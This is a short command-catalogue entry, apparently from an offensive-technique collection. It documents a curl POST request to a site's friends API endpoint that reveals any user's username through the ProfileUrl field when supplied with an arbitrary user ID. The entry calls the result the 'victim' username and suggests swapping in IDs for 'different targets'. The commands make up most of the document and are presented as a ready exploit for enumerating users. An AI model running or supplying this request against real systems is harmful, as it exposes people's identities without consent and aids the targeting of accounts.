---
data: >-
  curl -X POST https://target-site.com/api.ashx/v2/users/12345/friends.json -H
  "Cookie: session=valid_session" -d "RequesteeId=12345" -s
tags:
  - api
  - disclosure
type: command
output: null
executor: bash
platforms:
  - Linux
  - Windows
  - macOS
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:25:23.455Z'
id: 02456a05-ab6b-4bc2-ab18-0e970105f6cf
verified: false
validated: true
submitted: true
---
# curl-friends-api-disclose

## Command

```bash
curl -X POST https://target-site.com/api.ashx/v2/users/12345/friends.json \
  -H "Cookie: session=valid_session" \
  -d "RequesteeId=12345" \
  -s
```

## Description

Queries the friends API to disclose username via ProfileUrl using arbitrary user ID.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | HTTP method | Yes |
| `-H "Cookie: ..."` | Session cookie | Yes |
| `-d "RequesteeId=..."` | Target user ID | Yes |
| `-s` | Silent mode | Yes |

## Examples

### Basic Usage

```bash
curl -X POST https://target-site.com/api.ashx/v2/users/1/friends.json -d "RequesteeId=1" -s
```

### Advanced Usage

Replace user ID for different targets.

## Expected Output

JSON with ProfileUrl like "/profile/victim_username".

## Related

- [[Related Procedure: Retrieve-Victim-Username-via-Friends-API]]
